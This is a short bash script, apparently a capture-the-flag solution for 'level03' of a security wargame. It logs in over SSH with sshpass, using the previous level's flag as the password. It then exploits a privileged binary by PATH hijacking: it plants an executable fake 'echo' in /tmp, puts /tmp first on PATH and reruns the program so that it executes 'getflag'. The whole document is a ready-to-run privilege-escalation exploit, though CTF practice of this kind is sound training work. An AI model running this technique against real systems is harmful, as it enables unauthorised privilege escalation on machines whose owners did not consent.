#!/bin/bash
MY_PATH=$(dirname "$0")            # relative
MY_PATH=$(cd "$MY_PATH" && pwd)    # absolutized and normalized

HOST=level03@$1
SSHPORT=4242
PASSWORD=$(cat $MY_PATH/../../level02/flag)

if [ $# -eq 1 ]; then
	# ssh
	sshpass -p $PASSWORD ssh -q $HOST -p $SSHPORT<<'ENDSSH'
		./level03
		echo "[+] Replace echo command by my own command"
		echo 'getflag' > /tmp/echo
		chmod a+x /tmp/echo
		export PATH=/tmp:$PATH
		./level03
ENDSSH

else
	printf "usage: ./script.sh [host]\n\texample [host] - 192.168.1.128"
fi
